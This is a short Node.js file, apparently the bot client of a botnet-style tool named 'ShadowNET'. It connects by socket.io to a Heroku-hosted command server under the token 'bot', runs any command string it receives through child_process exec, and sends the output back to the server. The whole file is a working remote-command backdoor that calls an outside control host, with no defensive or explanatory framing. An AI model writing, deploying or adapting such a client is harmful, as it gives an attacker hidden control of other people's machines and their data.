const { io } = require("socket.io-client")
const { uuid } = require('uuidv4')
const { exec } = require("child_process")
const chalk = require('chalk')

const devMode = false
const serverUrl = devMode ? 'http://localhost:3000' : 'https://shadownet-server.herokuapp.com/'

const disconnectionReasons = {
    'transport close': 'server has been shutdown.',
    'transport error': 'server internal error.',
    'ping timeout': 'no response from the server.',
    'io client disconnect': 'forced disconnection.',
    'io server disconnect': 'server forced shutdown.'
}
const levelOfAccess = {
    0: 'Administrator',
    1: 'Moderator',
    2: 'Member'
}

class ProbeRes{
    constructor(error, output, inErr){
        this.error = error
        this.output = output
        this.inErr = inErr
    }
}

const connect = (id=uuid()) => {
    console.log(`\n[${chalk.blue.bold('CONNECTING')}] Waiting for server response...`)

    // Connection
    const socket = io(serverUrl, {
        auth: {
            token: 'bot',
            id: id
        }
    })

    // CLIENT EVENTS

    socket.on("connect", () => {
        console.log(`[${chalk.green.bold('CONNECTED')}] Succesfully connected to ${chalk.magenta.bold('ShadowNET')}.`)
    })

    socket.on("connect_error", () => {
        console.log(`[${chalk.blue.bold('RESTABLISHING')}] Lost connection to ${chalk.magenta.bold('ShadowNET')}. Trying to restablish connection...`)
    })

    socket.on("disconnect", (reason) => {
        console.log(`[${chalk.red.bold('DISCONNECTED')}] Connection to ${chalk.magenta.bold('ShadowNET')} closed. => ${disconnectionReasons[reason]}`)
    })

    socket.on("hello", (arg) => {
        console.log(arg)
    })

    socket.on("cmd", (data) => {
        exec(data.cmd, (e, r, er) => {
            let response = new ProbeRes(e, r, er)

            socket.emit("probe_pkg", {response: response, socketID: data.socketID})
        })
    })

    socket.on('yell', (data) => {
        console.log(`\nGLOBAL EVENT ============================\n\n${data}\n`)
    })
}

connect()